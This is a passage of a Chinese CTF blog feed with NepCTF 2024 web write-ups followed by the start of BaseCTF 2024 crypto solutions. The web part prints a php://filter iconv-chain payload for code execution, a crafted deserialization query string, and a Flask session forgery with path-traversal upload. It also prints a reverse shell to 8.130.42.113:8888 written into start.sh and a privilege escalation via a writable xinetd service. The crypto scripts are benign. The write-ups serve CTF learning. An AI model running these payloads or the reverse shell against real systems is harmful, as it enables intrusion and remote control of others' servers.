=&gt; <span class="hljs-string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;x&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,<br>    <span class="hljs-string">&#x27;y&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,<br>    <span class="hljs-string">&#x27;z&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,<br>);<br><br><span class="hljs-variable">$filters</span> = <span class="hljs-string">&quot;convert.base64-encode|&quot;</span>;<br><span class="hljs-comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br><span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$base64_payload</span>)) <span class="hljs-keyword">as</span> <span class="hljs-variable">$c</span>) &#123;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-variable">$conversions</span>[<span class="hljs-variable">$c</span>] . <span class="hljs-string">&quot;|&quot;</span>;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.base64-decode|&quot;</span>;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.base64-encode|&quot;</span>;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.base64-decode&quot;</span>;<br><br><span class="hljs-variable">$final_payload</span> = <span class="hljs-string">&quot;php://filter/<span class="hljs-subst">&#123;$filters&#125;</span>/resource=index.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$final_payload</span>;<br></code></pre></td></tr></table></figure><p>得到答案最后就是</p><p>Get传参</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;S:5:&quot;\00key\00&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;&amp;nep1=%f0abc%f0abc%f0abc%f0abc%9f%9f&amp;nep=Nep<br></code></pre></td></tr></table></figure><p>post传参</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1=php://filter/convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php<br></code></pre></td></tr></table></figure><p>最后通过<code>?cmd=system('env');</code>得到flag</p><p><img src="/../../images/nepctf/2024/php4.png" alt="php4"></p><h2 id="蹦蹦炸弹boom_it"><a class="markdownIt-Anchor" href="#蹦蹦炸弹boom_it"></a> 蹦蹦炸弹（boom_it）</h2><p>审计一下代码，直接给了secret_key,用户是HRP，flask伪造session</p><p><img src="/../../images/nepctf/2024/boom1.png" alt="boom1"></p><p>随便写个前端上传个文件再修改一下内容为…/…/lock.txt</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST数据包POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://neptune-29348.nepctf.lemonprefect.cn/admin/dashboard&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--链接是当前打开的题目链接--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>只有就有File uploaded successfully</p><p>然后改回GET，尝试?cmd=ls</p><p><img src="/../../images/nepctf/2024/boom2.png" alt="boom2"></p><p>尝试读取flag发现并不能读取，发现start.sh可写入，尝试反弹shell</p><p><code>?cmd=echo+&quot;bash+-i+&gt;%26+/dev/tcp/8.130.42.113/8888+0&gt;%261&quot;+&gt;+start.sh</code></p><p><code>?cmd=bash+start.sh</code></p><p>进去发现是root权限才能读出</p><p><img src="/../../images/nepctf/2024/boom3.png" alt="boom3"></p><p>执行命令<code>ps -aux</code></p><p>可以看到一个<code>/usr/sbin/xinetd</code>是由root权限得到的</p><p>查看<code>etc/xinetd.d/</code>看到pwnservice里面有个端口8888,并且这个可以写入，可以尝试利用8888进行连接</p><p>这里继续看晨曦师傅的wp</p><p>我是需要<code>echo &quot;./pwn;chmod 777 /home/ctfuser/*&quot; &gt;&gt; /home/ctfuser/start.sh&quot;</code>这里改为最大权限</p><p>然后nc 127.0.0.1 8888,(<code>python3 -c &quot;import socket;sock = socket.socket();sock.connect(('127.0.0.1', 8888));&quot;</code>)随后<code>ls -al</code>可以发现flag是可以打开的了，可以cat flag</p><p><img src="/../../images/nepctf/2024/boom4.png" alt="boom4"></p><hr><p>复盘就到这了，剩下的有些知识点确实完全不知道，等下学期好好恶补一下，第一次打nep学到了很多东西。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
      <tag>Misc</tag>
      
      <tag>serialize</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Basectf2024</title>
    <link href="/2024/08/21/basectf/basectf2024/"/>
    <url>/2024/08/21/basectf/basectf2024/</url>
    
    <content type="html"><![CDATA[<h1 id="week1"><a class="markdownIt-Anchor" href="#week1"></a> Week1</h1><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2><h3 id="hello_crypto"><a class="markdownIt-Anchor" href="#hello_crypto"></a> hello_crypto</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> Crypto.Util.number import long_to_bytes<br><span class="hljs-keyword">from</span> Crypto.Cipher import AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding import unpad<br><br><span class="hljs-comment"># 已知的 key1 和密文</span><br>key1 = 208797759953288399620324890930572736628<br>ciphertext = b<span class="hljs-string">&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;</span><br><br><span class="hljs-comment"># 将 key1 转换为字节格式</span><br>key = long_to_bytes(key1)<br><br><span class="hljs-comment"># 创建 AES 解密器</span><br>my_aes = AES.new(<span class="hljs-attribute">key</span>=key, <span class="hljs-attribute">mode</span>=AES.MODE_ECB)<br><br><span class="hljs-comment"># 解密并去除填充</span><br>decrypted_data = unpad(my_aes.decrypt(ciphertext), AES.block_size)<br><br><span class="hljs-comment"># 打印解密后的数据</span><br><span class="hljs-built_in">print</span>(decrypted_data)<br></code></pre></td></tr></table></figure><h3 id="ez_rsa"><a class="markdownIt-Anchor" href="#ez_rsa"></a> ez_rsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, inverse<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-comment"># 已知的 n, not_phi 和 c</span><br>n = <span class="hljs-number">96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421</span><br>not_phi = <span class="hljs-number">96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205</span><br>c = <span class="hljs-number">37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-comment"># Step 1: 从 n 和 not_phi 计算出 p 和 q</span><br><span class="hljs-comment"># p*q = n, (p+2)*(q+2) = not_phi</span><br><span class="hljs-comment"># 展开得到 pq + 2p + 2q + 4 = not_phi</span><br><span class="hljs-comment"># p + q = (not_phi - n - 4) / 2</span><br><br>s = (not_phi - n - <span class="hljs-number">4</span>) // <span class="hljs-number">2</span><br><span class="hljs-comment"># 使用求解二次方程的方法解出 p 和 q</span><br><span class="hljs-comment"># x^2 - sx + n = 0</span><br>discriminant = gmpy2.isqrt(s*s - <span class="hljs-number">4</span>*n)<br>p = (s + discriminant) // <span class="hljs-number">2</span><br>q = (s - discriminant) // <span class="hljs-number">2</span><br><br><span class="hljs-comment"># Step 2: 计算 φ(n)</span><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Step 3: 计算私钥 d</span><br>d = inverse(e, phi)<br><br><span class="hljs-comment"># Step 4: 解密密文</span><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><br><span class="hljs-comment"># Step 5: 将解密的数字转换为字符串</span><br>decrypted_message = long_to_bytes(m)<br><br><span class="hljs-comment"># 打印解密后的数据</span><br><span class="hljs-built_in">print</span>(decrypted_message)<br></code></pre></td></tr></table></figure><h3 id="你会算md5吗"><a class="markdownIt-Anchor" href="#你会算md5吗"></a> 你会算md5吗</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-comment"># Helper function to compute MD5 hash of a string</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_hash</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(text.encode()).hexdigest()<br><br><span class="hljs-comment"># Possible characters</span><br>possible_chars = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()_+-=[]&#123;&#125;|;:,.&lt;&gt;?/&quot;</span><br><br><span class="hljs-comment"># Given hashes</span><br>hashes = [<br>    <span class="hljs-string">&#x27;9d5ed678fe57bcca610140957afab571&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>,<br>    <span class="hljs-string">&#x27;03c7c0ace395d80182db07ae2c30f034&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>,<br>    <span class="hljs-string">&#x27;0d61f8370cad1d412f80b84d143e1257&#x27;</span>, <span class="hljs-string">&#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;</span>,<br>    <span class="hljs-string">&#x27;800618943025315f869e4e1f09471012&#x27;</span>, <span class="hljs-string">&#x27;f95b70fdc3088560732a5ac135644506&#x27;</span>,<br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>,<br>    <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>,<br>    <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>,<br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;</span>,<br>    <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>,<br>    <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>,<br>    <span class="hljs-string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>,<br>    <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;</span>,<br>    <span class="hljs-string">&#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>,<br>    <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>,<br>    <span class="hljs-string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>,<br>    <span class="hljs-string">&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>,<br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>,<br>    <span class="hljs-string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>,<br>    <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>,<br>    <span class="hljs-string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>,<br>    <span class="hljs-string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>,<br>    <span class="hljs-string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>,<br>    <span class="hljs-string">&#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;</span><br>]<br><br><span class="hljs-comment"># Find corresponding characters</span><br>decoded_flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> hash_val <span class="hljs-keyword">in</span> hashes:<br>    found = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> possible_chars:<br>        <span class="hljs-keyword">if</span> md5_hash(char) == hash_val:<br>            decoded_flag += char<br>            found = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>        decoded_flag += <span class="hljs-string">&#x27;?&#x27;</span>  <span class="hljs-comment"># Use a placeholder if hash not found</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decoded flag: <span class="hljs-subst">&#123;decoded_flag&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><h3 id="十七倍"><a class="markdownIt-Anchor" href="#十七倍"></a> 十七倍</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 